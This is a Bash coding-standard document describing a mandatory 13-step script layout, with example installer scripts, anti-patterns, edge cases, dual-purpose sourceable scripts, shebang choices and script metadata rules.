# Bash Coding Standard

Comprehensive Bash coding standard for Bash 5.2+; not a compatibility standard.

"This isn't just a coding standard - it's a systems engineering philosophy applied to Bash." -- Biksu Okusi

## Coding Principles
- K.I.S.S.
- "The best process is no process"
- "Everything should be made as simple as possible, but not any simpler."
- Remove unused functions/variables from production scripts

## Contents
1. [Script Structure & Layout](#script-structure--layout)
2. [Variable Declarations & Constants](#variable-declarations--constants)
3. [Variable Expansion & Parameter Substitution](#variable-expansion--parameter-substitution)
4. [Quoting & String Literals](#quoting--string-literals)
5. [Arrays](#arrays)
6. [Functions](#functions)
7. [Control Flow](#control-flow)
8. [Error Handling](#error-handling)
9. [Input/Output & Messaging](#inputoutput--messaging)
10. [Command-Line Arguments](#command-line-arguments)
11. [File Operations](#file-operations)
12. [Security Considerations](#security-considerations)
13. [Code Style & Best Practices](#code-style--best-practices)
14. [Advanced Patterns](#advanced-patterns)

BSC00


---


**Rule: BCS0100**

# Script Structure & Layout

This section defines the mandatory 13-step structural layout for all Bash scripts, covering organization from shebang through `#fin` marker, including script metadata, shopt settings, dual-purpose patterns, FHS compliance, file extensions, and bottom-up function organization where low-level utilities precede high-level orchestration.


---


**Rule: BCS010101**

### Complete Working Example

Production installation script demonstrating all 13 BCS0101 steps.

---

## Installation Script Structure

```bash
#!/bin/bash
#shellcheck disable=SC2034
# Configurable installation script with dry-run mode
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

VERSION='2.1.420'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME

declare -- PREFIX='/usr/local' APP_NAME='myapp' SYSTEM_USER='myapp'
declare -- BIN_DIR="$PREFIX/bin" LIB_DIR="$PREFIX/lib" CONFIG_DIR="/etc/$APP_NAME" LOG_DIR="/var/log/$APP_NAME"
declare -i DRY_RUN=0 FORCE=0 INSTALL_SYSTEMD=0
declare -a WARNINGS=() INSTALLED_FILES=()

if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi

declare -i VERBOSE=1

_msg() {
  local -- status="${FUNCNAME[1]}" prefix="$SCRIPT_NAME:"
  case "$status" in
    info)    prefix+=" ${CYAN}â—‰${NC}" ;;
    warn)    prefix+=" ${YELLOW}â–²${NC}" ;;
    success) prefix+=" ${GREEN}âœ“${NC}" ;;
    error)   prefix+=" ${RED}âœ—${NC}" ;;
  esac
  printf '%s %s\n' "$prefix" "$1"
}

info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
noarg() { (($# > 1)) || die 22 "Option '$1' requires an argument"; }

update_derived_paths() {
  BIN_DIR="$PREFIX"/bin
  LIB_DIR="$PREFIX"/lib
  CONFIG_DIR=/etc/"$APP_NAME"
  LOG_DIR=/var/log/"$APP_NAME"
}

check_prerequisites() {
  local -i missing=0
  for cmd in install mkdir chmod; do
    command -v "$cmd" >/dev/null 2>&1 || { error "Missing '$cmd'"; missing=1; }
  done
  ((missing==0)) || die 1 'Missing required commands'
  success 'Prerequisites satisfied'
}

validate_config() {
  [[ -n "$PREFIX" ]] || die 22 'PREFIX cannot be empty'
  [[ "$PREFIX" =~ [[:space:]] ]] && die 22 'PREFIX cannot contain spaces'
  [[ -n "$APP_NAME" && "$APP_NAME" =~ ^[a-z][a-z0-9_-]*$ ]] || die 22 'Invalid APP_NAME'
  success 'Config validated'
}

create_directories() {
  for dir in "$BIN_DIR" "$LIB_DIR" "$CONFIG_DIR" "$LOG_DIR"; do
    if ((DRY_RUN)); then
      info "[DRY-RUN] Would create '$dir'"
    elif [[ ! -d "$dir" ]]; then
      mkdir -p "$dir" || die 1 "Failed to create '$dir'"
      success "Created '$dir'"
    fi
  done
}

install_binaries() {
  local -- source="$SCRIPT_DIR/bin" target="$BIN_DIR"
  [[ -d "$source" ]] || die 2 "Source not found '$source'"

  ((DRY_RUN==0)) || { info "[DRY-RUN] Would install binaries"; return 0; }

  local -i count=0
  for file in "$source"/*; do
    [[ -f "$file" ]] || continue
    local -- basename=${file##*/} target_file="$target/$basename"

    if [[ -f "$target_file" ]] && ! ((FORCE)); then
      warn "File exists '$target_file'"
      continue
    fi

    install -m 755 "$file" "$target_file" || die 1 "Install failed '$basename'"
    INSTALLED_FILES+=("$target_file")
    count+=1
  done
  success "Installed $count binaries"
}

generate_config() {
  local -- config_file="$CONFIG_DIR/$APP_NAME.conf"
  ((DRY_RUN==0)) || { info "[DRY-RUN] Would generate config"; return 0; }
  [[ -f "$config_file" ]] && ! ((FORCE)) && { warn "Config exists"; return 0; }

  cat > "$config_file" <<EOT
# $APP_NAME configuration
[installation]
prefix = $PREFIX
version = $VERSION

[paths]
bin_dir = $BIN_DIR
config_dir = $CONFIG_DIR
log_dir = $LOG_DIR
EOT
  chmod 644 "$config_file"
  success "Generated config"
}

main() {
  while (($#)); do
    case $1 in
      -p|--prefix)  noarg "$@"; shift; PREFIX="$1"; update_derived_paths ;;
      -u|--user)    noarg "$@"; shift; SYSTEM_USER="$1" ;;
      -n|--dry-run) DRY_RUN=1 ;;
      -f|--force)   FORCE=1 ;;
      -v|--verbose) VERBOSE=1 ;;
      -h|--help)    usage; exit 0 ;;
      -*)           die 22 "Invalid option '$1'" ;;
    esac
    shift
  done

  readonly -- PREFIX APP_NAME SYSTEM_USER BIN_DIR LIB_DIR CONFIG_DIR LOG_DIR
  readonly -i VERBOSE DRY_RUN FORCE

  ((DRY_RUN==0)) || info 'DRY-RUN mode enabled'

  info "Installing $APP_NAME v$VERSION"
  check_prerequisites
  validate_config
  create_directories
  install_binaries
  generate_config

  ((DRY_RUN)) && info 'Dry-run complete' || success 'Installation complete'
}

main "$@"

#fin
```

---

## Key Patterns Demonstrated

**13-Step Structure:** Shebang with shellcheck directive â†’ strict mode (`set -euo pipefail`) â†’ shopt settings â†’ metadata (VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME all readonly) â†’ globals â†’ TTY-aware colors â†’ messaging functions â†’ business logic â†’ main() â†’ invocation â†’ `#fin` marker.

**Derived Paths:** When PREFIX changes via argument, `update_derived_paths()` updates all dependent paths (BIN_DIR, LIB_DIR, CONFIG_DIR, LOG_DIR) - single source of truth pattern.

**Progressive Readonly:** Variables declared mutable, modified by argument parsing, then locked with `readonly` before execution - prevents accidental modification during workflow.

**Dry-Run Pattern:** Every destructive operation checks `((DRY_RUN))` and shows intent without executing - essential for installer validation.

**Messaging Suite:** `_msg()` core uses `FUNCNAME[1]` to determine caller type and apply appropriate icon/color. Wrappers (info, warn, success, error) respect VERBOSE flag and redirect to stderr.

**Argument Parsing:** Full short/long option support with `noarg()` validation, immediate path updates via callbacks, readonly lock after parsing complete.

**Validation Workflow:** Check prerequisites â†’ validate configuration â†’ execute operations - fail early pattern prevents partial installations.

**Production Features:** Force mode for overwrites, verbose/quiet modes, comprehensive error handling with meaningful exit codes, summary reporting.


---


**Rule: BCS010102**

### Common Layout Anti-Patterns

**This subrule demonstrates common violations of the BCS0101 13-step layout pattern.**

---

## Anti-Patterns

###  Wrong: Missing `set -euo pipefail`

```bash
#!/usr/bin/env bash

# Script starts without error handling
VERSION='1.0.0'

# Commands can fail silently
rm -rf /important/data
cp config.txt /etc/
```

**Problem:** Errors not caught; script continues after failures, causing silent corruption.

###  Correct: Error Handling First

```bash
#!/usr/bin/env bash

# Installation script with proper safeguards

set -euo pipefail

shopt -s inherit_errexit shift_verbose

VERSION='1.0.0'
# ... rest of script
```

---

###  Wrong: Declaring Variables After Use

```bash
#!/usr/bin/env bash
set -euo pipefail

main() {
  # Using VERBOSE before it's declared
  ((VERBOSE)) && echo 'Starting...'

  process_files
}

# Variables declared after main()
declare -i VERBOSE=0

main "$@"
#fin
```

**Problem:** Variables referenced before declaration cause "unbound variable" errors with `set -u`.

###  Correct: Declare Before Use

```bash
#!/usr/bin/env bash
set -euo pipefail

# Declare all globals up front
declare -i VERBOSE=0
declare -i DRY_RUN=0

main() {
  # Now safe to use
  ((VERBOSE)) && echo 'Starting...'

  process_files
}

main "$@"
#fin
```

---

###  Wrong: Business Logic Before Utilities

```bash
#!/usr/bin/env bash
set -euo pipefail

# Business logic defined first
process_files() {
  local -- file
  for file in *.txt; do
    # Calling die() which isn't defined yet!
    [[ -f "$file" ]] || die 2 "Not a file '$file'"
    echo "Processing '$file'"
  done
}

# Utilities defined after business logic
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

main() {
  process_files
  : ...
}

main "$@"
#fin
```

**Problem:** Function calls target that isn't defined yet. While bash resolves at runtime, this violates bottom-up organization and harms readability.

###  Correct: Utilities Before Business Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

# Utilities first
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

# Business logic can safely call utilities
process_files() {
  local -- file
  for file in *.txt; do
    [[ -f "$file" ]] || die 2 "Not a file '$file'"
    echo "Processing '$file'"
  done
}

main() {
  process_files
}

main "$@"
#fin
```

---

###  Wrong: No `main()` Function in Large Script

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

# ... 200 lines of functions ...

# Argument parsing scattered throughout
if [[ "$1" == '--help' ]]; then
  echo 'Usage: ...'
  exit 0
fi

# Business logic runs directly
check_prerequisites
validate_config
install_files

echo 'Done'
#fin
```

**Problem:** No clear entry point, scattered parsing, can't test individual functions.

###  Correct: Use `main()` for Scripts Over 40 Lines

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

# ... 200 lines of functions ...

main() {
  # Centralized argument parsing
  while (($#)); do
    case $1 in
      -h|--help) usage; exit 0 ;;
      *) die 22 "Invalid argument '$1'" ;;
    esac
    shift
  done

  # Clear execution flow
  check_prerequisites
  validate_config
  install_files

  success 'Installation complete'
}

main "$@"
#fin
```

---

###  Wrong: Readonly Before Parsing Arguments

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
PREFIX='/usr/local'

# Made readonly too early!
readonly -- VERSION PREFIX

main() {
  while (($#)); do
    case $1 in
      --prefix)
        shift
        # This will fail - PREFIX is readonly!
        PREFIX="$1"
        ;;
    esac
    shift
  done
}

main "$@"
#fin
```

**Problem:** Variables modified during argument parsing made readonly too early.

###  Correct: Readonly After Argument Parsing

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "$0")
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_NAME  # These never change

declare -- PREFIX='/usr/local'  # Will be modified during parsing

main() {
  while (($#)); do
    case $1 in
      --prefix)
        shift
        PREFIX="$1"  # OK - not readonly yet
        ;;
    esac
    shift
  done

  # Now make readonly after parsing complete
  readonly -- PREFIX

  # Rest of logic...
}

main "$@"
#fin
```

---

###  Wrong: Mixing Declaration and Logic

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

# Some globals
declare -i VERBOSE=0

# Function in the middle
check_something() {
  echo 'Checking...'
}

# More globals after function
declare -- PREFIX='/usr/local'
declare -- CONFIG_FILE=''

main() {
  check_something
}

main "$@"
#fin
```

**Problem:** Scattered globals make it hard to see all state variables at once.

###  Correct: All Globals Together

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'

# All globals in one place
declare -i VERBOSE=0
declare -- PREFIX='/usr/local'
declare -- CONFIG_FILE=''

# All functions after globals
check_something() {
  echo 'Checking...'
}

main() {
  check_something
}

main "$@"
#fin
```

---

###  Wrong: Sourcing Without Protecting Execution

```bash
#!/usr/bin/env bash
# This file is meant to be sourced, but...

set -euo pipefail  # Modifies caller's shell!

die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

# Runs automatically when sourced!
main "$@"
#fin
```

**Problem:** When sourced, this modifies caller's shell settings and runs `main` automatically.

###  Correct: Dual-Purpose Script

```bash
#!/usr/bin/env bash
# Only set strict mode when executed (not sourced)

error() { >&2 echo "ERROR: $*"; }

die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }

# Only run main when executed (not sourced)
# Fast exit if sourced
[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0

# Now start main script
set -euo pipefail

VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_NAME  # These never change

: ...

main() {
  echo 'Running main'
  : ...
}

main "$@"

#fin
```

---

## Summary

These eight anti-patterns represent the most common BCS0101 violations:

1. **Missing strict mode** - Scripts without `set -euo pipefail` fail silently
2. **Declaration order** - Variables must be declared before use
3. **Function organization** - Utilities must come before business logic
4. **Missing main()** - Large scripts need structured entry point
5. **Premature readonly** - Variables that change must not be readonly until after parsing
6. **Scattered declarations** - All globals must be grouped together
7. **Mixing declaration and logic** - Keep all globals in one section
8. **Unprotected sourcing** - Dual-purpose scripts must protect execution code

Following correct patterns ensures scripts are safe, maintainable, and predictable.


---


**Rule: BCS010103**

### Edge Cases and Variations

**Special scenarios where the standard 13-step BCS0101 layout may be modified for specific use cases.**

---

## When to Skip `main()` Function

**Scripts under 200 lines** can skip `main()` and run directly:

```bash
#!/usr/bin/env bash
set -euo pipefail

# Simple file counter - only 20 lines total
declare -i count=0

for file in "$@"; do
  [[ ! -f "$file" ]] || count+=1
done

echo "Found $count files"
#fin
```

**Rationale:** The overhead of `main()` isn't justified for trivial scripts.

---

## Sourced Library Files

**Files meant only to be sourced** skip execution parts:

```bash
#!/usr/bin/env bash
# Library of utility functions - meant to be sourced, not executed

# Don't use set -e when sourced (would affect caller)
# Don't make variables readonly (caller might need to modify)

is_integer() {
  [[ "$1" =~ ^-?[0-9]+$ ]]
}

is_valid_email() {
  [[ "$1" =~ ^[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}$ ]]
}

# No main(), no execution
# Just function definitions for other scripts to use
#fin
```

---

## Scripts With External Configuration

**When sourcing config files**, structure includes:

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
: ...

# Default configuration
declare -- CONFIG_FILE="${XDG_CONFIG_HOME:-$HOME/.config}/myapp/config.sh"
declare -- DATA_DIR="${XDG_DATA_HOME:-$HOME/.local/share}/myapp"

# Source config file if it exists and can be read
if [[ -r "$CONFIG_FILE" ]]; then
  #shellcheck source=/dev/null
  source "$CONFIG_FILE" || die 1 "Failed to source config '$CONFIG_FILE'"
fi

# Now make readonly after sourcing config
readonly -- CONFIG_FILE DATA_DIR

# ... rest of script
```

---

## Platform-Specific Sections

**Handling multiple platforms:**

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
: ...

# Detect platform
declare -- PLATFORM
case $(uname -s) in
  Darwin) PLATFORM='macos' ;;
  Linux)  PLATFORM='linux' ;;
  *)      PLATFORM='unknown' ;;
esac
readonly -- PLATFORM

# Platform-specific global variables
case $PLATFORM in
  macos)
    declare -- PACKAGE_MANAGER='brew'
    declare -- INSTALL_CMD='brew install'
    ;;
  linux)
    declare -- PACKAGE_MANAGER='apt'
    declare -- INSTALL_CMD='apt-get install'
    ;;
  *)
    die 1 "Unsupported platform '$PLATFORM'"
    ;;
esac

readonly -- PACKAGE_MANAGER INSTALL_CMD

: ... rest of script
```

---

## Scripts With Cleanup Requirements

**When trap handlers are needed:**

```bash
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
: ...

# Temporary files array for cleanup
declare -a TEMP_FILES=()

cleanup() {
  local -i exit_code=${1:-$?}
  local -- file

  for file in "${TEMP_FILES[@]}"; do
    [[ ! -f "$file" ]] || rm -f "$file"
  done

  return "$exit_code"
}

# Set trap early, after functions are defined
trap 'cleanup $?' SIGINT SIGTERM EXIT

# ... rest of script uses TEMP_FILES
```

**Trap should be set** after cleanup function is defined but before any code that creates temp files.

---

## When to Deviate from Standard Layout

The 13-step layout is **strongly recommended**, but legitimate exceptions exist:

### Simplifications
- **Tiny scripts (<200 lines)** - Skip `main()`, run code directly
- **Library files** - Skip `set -e`, `main()`, script invocation
- **One-off utilities** - May skip color definitions, verbose messaging

### Extensions
- **External configuration** - Add config sourcing between metadata and business logic
- **Platform detection** - Add platform-specific globals after standard globals
- **Cleanup traps** - Add trap setup after utility functions but before business logic
- **Logging setup** - May add log file initialization after metadata
- **Lock files** - Add lock acquisition/release around main execution

### Key Principles

Even when deviating, maintain:

1. **Safety first** - `set -euo pipefail` still comes first (unless library file)
2. **Dependencies before usage** - Bottom-up organization still applies
3. **Clear structure** - Readers should easily understand the flow
4. **Minimal deviation** - Only deviate when there's clear benefit
5. **Document reasons** - Comment why you're deviating from standard

### Anti-Pattern: Arbitrary Reordering

```bash
#  Wrong - arbitrary reordering without reason
#!/usr/bin/env bash

# Functions before set -e
validate_input() { : ... }

set -euo pipefail  # Too late!

# Globals scattered
VERSION='1.0.0'
check_system() { : ... }
declare -- PREFIX='/usr'
```

```bash
#  Correct - standard order maintained
#!/usr/bin/env bash
set -euo pipefail

VERSION='1.0.0'
declare -- PREFIX='/usr'

validate_input() { : ... }
check_system() { : ... }
```

---

## Summary

Edge cases exist for legitimate reasons:
- **Simplification** for tiny scripts that don't need full structure
- **Libraries** that shouldn't modify sourcing environment
- **External config** that must override defaults
- **Platform detection** for cross-platform compatibility
- **Cleanup traps** for resource management

But even with edge cases, the core principles remain:
- Error handling first
- Dependencies before usage
- Clear, predictable structure

Deviate only when necessary, and always maintain the spirit of the standard: **safety, clarity, and maintainability**.


---


**Rule: BCS0101**

## General Layouts for Standard Script

**All Bash scripts must follow a 13-step structural layout ensuring consistency, maintainability, and correctness. This bottom-up pattern places low-level utilities before high-level orchestration, allowing each component to safely call previously defined functions.**

Details: **BCS010101** (example), **BCS010102** (anti-patterns), **BCS010103** (edge cases)

---

## Rationale

1. **Predictability** - Standardized locations: metadata (step 6), utilities (step 9), logic (step 10), orchestration (step 11)
2. **Safe Initialization** - Error handling precedes execution, metadata precedes functions, variables precede references
3. **Bottom-Up Dependencies** - Lower-level components defined first; each function safely calls previously defined functions
4. **Error Prevention** - Structure prevents undefined functions, uninitialized variables, unconfigured error handling
5. **Production Readiness** - Includes version tracking, error handling, terminal detection, argument validation, execution flow

---

## The 13 Mandatory Steps

### Step 1: Shebang

```bash
#!/bin/bash
```

Alternatives: `#!/usr/bin/env bash` `#!/usr/bin/bash`

### Step 2: ShellCheck Directives (if needed)

```bash
#shellcheck disable=SC2034  # Unused variables OK (sourced by other scripts)
```

Always include explanatory comments. Use only when necessary.

### Step 3: Brief Description Comment

```bash
# Comprehensive installation script with configurable paths and dry-run mode
```

### Step 4: `set -euo pipefail`

**Mandatory:**

```bash
set -euo pipefail
```

- `set -e` - Exit on command failure
- `set -u` - Exit on undefined variable
- `set -o pipefail` - Pipelines fail if any command fails

Must precede all commands (except shebang/comments/shellcheck).

Optional Bash >= 5 test:
```bash
((${BASH_VERSINFO[0]:-0} > 4)) || { >&2 echo 'error: Require Bash version >= 5'; exit 95; }
```

### Step 5: `shopt` Settings

```bash
shopt -s inherit_errexit shift_verbose extglob nullglob
```

- `inherit_errexit` - Subshells inherit `set -e`
- `shift_verbose` - Warn on shift without arguments
- `extglob` - Extended pattern matching
- `nullglob` - Empty globs expand to nothing

### Step 6: Script Metadata

```bash
VERSION='1.0.0'
SCRIPT_PATH=$(realpath -- "${BASH_SOURCE[0]}")
SCRIPT_DIR=${SCRIPT_PATH%/*}
SCRIPT_NAME=${SCRIPT_PATH##*/}
readonly -- VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME
```

Alternative:
```bash
declare -r VERSION='1.0.0'
#shellcheck disable=SC2155
declare -r SCRIPT_PATH=$(realpath -- "$0")
declare -r SCRIPT_DIR=${SCRIPT_PATH%/*} SCRIPT_NAME=${SCRIPT_PATH##*/}
```

SC2155 warnings safely ignored with `realpath`/`readlink`.

### Step 7: Global Variable Declarations

```bash
declare -- PREFIX='/usr/local'
declare -- CONFIG_FILE=''
declare -i VERBOSE=0 DRY_RUN=0 FORCE=0
declare -a INPUT_FILES=() WARNINGS=()
```

Always use: `declare -i` (integers), `declare --` (strings), `declare -a` (arrays), `declare -A` (associative)

### Step 8: Color Definitions (if terminal output)

```bash
if [[ -t 1 && -t 2 ]]; then
  readonly -- RED=$'\033[0;31m' GREEN=$'\033[0;32m' YELLOW=$'\033[0;33m' CYAN=$'\033[0;36m' NC=$'\033[0m'
else
  readonly -- RED='' GREEN='' YELLOW='' CYAN='' NC=''
fi
```

Skip if no colored output.

### Step 9: Utility Functions

```bash
declare -i VERBOSE=1

_msg() {
  local -- prefix="$SCRIPT_NAME:" msg
  case ${FUNCNAME[1]} in
    vecho)   : ;;
    info)    prefix+=" ${CYAN}â—‰${NC}" ;;
    warn)    prefix+=" ${YELLOW}â–²${NC}" ;;
    success) prefix+=" ${GREEN}âœ“${NC}" ;;
    error)   prefix+=" ${RED}âœ—${NC}" ;;
    *)       ;;
  esac
  for msg in "$@"; do printf '%s %s\n' "$prefix" "$msg"; done
}

vecho() { ((VERBOSE)) || return 0; _msg "$@"; }
info() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
warn() { ((VERBOSE)) || return 0; >&2 _msg "$@"; }
success() { ((VERBOSE)) || return 0; >&2 _msg "$@" || return 0; }
error() { >&2 _msg "$@"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
yn() {
  local -- REPLY
  >&2 read -r -n 1 -p "$(2>&1 warn "${1:-'Continue?'}") y/n "
  >&2 echo
  [[ ${REPLY,,} == y ]]
}
```

Simplified for minimal scripts:
```bash
info() { >&2 echo "${FUNCNAME[0]}: $*"; }
error() { >&2 echo "${FUNCNAME[0]}: $*"; }
die() { (($# > 1)) && error "${@:2}"; exit "${1:-0}"; }
```

Remove unused functions in production.

### Step 10: Business Logic Functions

```bash
check_prerequisites() {
  local -i missing=0
  local -- cmd
  for cmd in git make gcc; do
    command -v "$cmd" >/dev/null 2>&1 || { error "Required command not found '$cmd'"; missing+=1; }
  done
  ((missing==0)) || die 1 "Missing $missing required commands"
  success 'All prerequisites satisfied'
}

validate_config() {
  [[ -n "$PREFIX" ]] || die 22 'PREFIX cannot be empty'
  [[ -d "$PREFIX" ]] || die 2 "PREFIX directory does not exist '$PREFIX'"
  success 'Configuration validated'
}

install_files() {
  local -- source_dir=$1 target_dir=$2
  if ((DRY_RUN)); then
    info "[DRY-RUN] Would install '$source_dir' to '$target_dir'"
    return 0
  fi
  [[ -d "$source_dir" ]] || die 2 "Source directory not found '$source_dir'"
  mkdir -p "$target_dir" || die 1 "Failed to create '$target_dir'"
  cp -r "$source_dir"/* "$target_dir"/ || die 1 'Installation failed'
  success "Installed files to '$target_dir'"
}
```

Organize bottom-up: lower-level first, higher-level later.

### Step 11: `main()` Function

Required for scripts >100 lines:

```bash
main() {
  while (($#)); do
    case $1 in
      -p|--prefix)   noarg "$@"; shift; PREFIX="$1" ;;
      -v|--verbose)  VERBOSE+=1 ;;
      -q|--quiet)    VERBOSE=0 ;;
      -n|--dry-run)  DRY_RUN=1 ;;
      -V|--version)  echo "$SCRIPT_NAME $VERSION"; exit 0 ;;
      -h|--help)     usage; exit 0 ;;
      -[pvqnVh]*)    #shellcheck disable=SC2046
                     set -- '' $(printf -- "-%c " $(grep -o . <<<"${1:1}")) "${@:2}" ;;
      -*)            die 22 "Invalid option: $1" ;;
      *)             INPUT_FILES+=("$1") ;;
    esac
    shift
  done

  readonly -- PREFIX CONFIG_FILE
  readonly -i VERBOSE DRY_RUN

  ((DRY_RUN==0)) || info 'DRY-RUN mode enabled'
  check_prerequisites
  validate_config
  install_files "$SCRIPT_DIR"/data "$PREFIX"/share
  success 'Installation complete'
}
```

### Step 12: Script Invocation

```bash
main "$@"
```

Always quote `"$@"`.

### Step 13: End Marker

```bash
#fin
```

or `#end`

---

## Structure Tables

### Executable Scripts

| Step | Status | Element |
|------|--------|---------|
| 0 | Man | Shebang |
| 1 | Opt | ShellCheck directives |
| 2 | Opt | Description |
| 3 | Man | `set -euo pipefail` |
| 4 | Opt | Bash 5 test |
| 5 | Rec | `shopt` |
| 6 | Rec | Metadata |
| 7 | Rec | Globals |
| 8 | Rec | Colors |
| 9 | Rec | Utilities |
| 10 | Rec | Logic |
| 11 | Rec | `main()` |
| 12 | Rec | Invocation |
| 13 | Man | End marker |

Man=Mandatory, Opt=Optional, Rec=Recommended

**Module/Library:** Omit Step 3, Steps 11-12

**Combined Module/Executable:** Add Step 14: `[[ "${BASH_SOURCE[0]}" == "$0" ]] || return 0`, then Steps 14.0-14.13

---

## Anti-Patterns (BCS010102)

1. **Missing `set -euo pipefail`** - No error handling
2. **Variables before declaration** - Undefined behavior
3. **Business logic before utilities** - Undefined functions
4. **No `main()` in large scripts** - Untestable
5. **Missing end marker** - Incomplete files

---

## Edge Cases (BCS010103)

1. **Tiny scripts (<100 lines)** - May skip `main()`
2. **Sourced libraries** - Skip `set -e`, `main()`, invocation
3. **External config** - Add config sourcing
4. **Platform-specific** - Add platform detection
5. **Cleanup traps** - Add trap handlers

---

## Summary

The 13-step layout guarantees safety, ensures consistency, enables testing, prevents errors, documents intent, and simplifies maintenance.

**Scripts >100 lines:** Use all 13 steps. **Smaller scripts:** Steps 11-12 optional.

Deviations should be rare and justified.


---


**Rule: BCS010201**

### Dual-Purpose Scripts (Executable and Sourceable)

Scripts designed to work both as standalone executables and as source libraries must **ONLY** apply `set -euo pipefail` and `shopt` settings when executed directly, **NOT** when sourced.

**Rationale:** When sourced, `set -e` or `shopt` settings alter the calling shell's environment, potentially breaking the caller's error handling or glob behavior. Sourced scripts should provide functions/variables without side effects on caller state.

**Recommended pattern (early return):**
```bash
#!/bin/bash
# Description of dual-purpose script

# Function definitions (available in both modes)
my_function() {
  local -- arg="$1"
  [[ -n "$arg" ]] || return 1
  echo "Processing: $arg"
}
declare -fx my_function

# Early return for sourced mode - stops here when sourced
[[ ${BASH_SOURCE[0]} != "$0" ]] && return 0

# -----------------------------------------------------------------------------
# Executable code starts here (only runs when executed directly)
set -euo pipefail
shopt -s inherit_errexit shift_verbose extglob nullglob

# Metadata initialization with guard (allows re-sourcing safety)
if [[ ! -v SCRIPT_VERSION ]]; then
  declare -x SCRIPT_VERSION='1.0.0'
  declare -x SCRIPT_PATH=$(realpath -- "$0")
  declare -x SCRIPT_DIR=${SCRIPT_PATH%/*}
  declare -x SCRIPT_NAME=${SCRIPT_PATH##*/}
  readonly -- SCRIPT_VERSION SCRIPT_PATH SCRIPT_DIR SCRIPT_NAME
fi

# Helper functions (only needed for executable mode)
show_help() {
  cat <<EOT
$SCRIPT_NAME $SCRIPT_VERSION - Description

Usage: $SCRIPT_NAME [options] [arguments]
EOT
}

# Main execution logic
my_function "$@"

#fin
```

**Pattern breakdown:**

1. **Function definitions first** - Define all library functions at top, export with `declare -fx` if needed, available when sourced
2. **Early return** - `[[ ${BASH_SOURCE[0]} != "$0" ]] && return 0` - when sourced: functions loaded then immediate exit; when executed: continues. Using `!=` reads more naturally than `==`
3. **Visual separator** - Comment line marks executable section boundary
4. **Set and shopt** - Only applied when executed (never when sourced), placed immediately after separator
5. **Metadata with guard** - `if [[ ! -v SCRIPT_VERSION ]]` prevents re-initialization, safe to source multiple times, uses `-v` to test if variable is set

**Alternative pattern (if/else block):**

For scripts requiring different initialization in each mode:
```bash
#!/bin/bash

# Functions first
process_data() { ... }
declare -fx process_data

# Dual-mode initialization
if [[ ${BASH_SOURCE[0]} == "$0" ]]; then
  # EXECUTED MODE
  set -euo pipefail
  DATA_DIR=/var/lib/myapp
  process_data "$DATA_DIR"
else
  # SOURCED MODE - different initialization
  DATA_DIR=${DATA_DIR:-/tmp/test_data}
  # Export functions, return to caller
fi
```

**Key principles:**
- Prefer early return pattern for simplicity
- Place all function definitions **before** sourced/executed detection
- Only apply `set -euo pipefail` and `shopt` in executable section
- Use `return` (not `exit`) for errors when sourced
- Guard metadata with `[[ ! -v VARIABLE ]]` for idempotence
- Test both modes: `./script.sh` (execute) and `source script.sh` (source)

**Real-world examples:**
- `bash-coding-standard` script in this repository
- `getbcscode.sh` provides `get_BCS_code_from_rule_filename()` function

**Common use cases:**
- Utility libraries that can demonstrate usage when executed
- Scripts providing reusable functions plus CLI interface
- Test frameworks that can be sourced for functions or run for tests


---


**Rule: BCS0102**

## Shebang and Initial Setup

First lines: shebang, optional shellcheck directives, brief description, then `set -euo pipefail`.

```bash
#!/bin/bash
#shellcheck disable=SC1090,SC1091
# Get directory sizes and report usage statistics
set -euo pipefail
```

**Allowable shebangs:**

1. `#!/bin/bash` - Most portable (standard Linux location)
2. `#!/usr/bin/bash` - FreeBSD/BSD systems
3. `#!/usr/bin/env bash` - Maximum portability (searches PATH)

**Rationale:** These three shebangs cover all common scenarios. `set -euo pipefail` must execute first to enable strict error handling before any other commands.


---


**Rule: BCS0103**

## Script Metadata

**Every script must declare standard metadata variables (VERSION, SCRIPT_PATH, SCRIPT_DIR, SCRIPT_NAME) immediately after `shopt` settings. Make these readonly as a group.**

**Rationale:**

- **Reliable Path Resolution**: `realpath` provides canonical absolute paths and fails early if script doesn't exist
- **Self-Documentation**: VERSION enables versioning for deployment and debugging
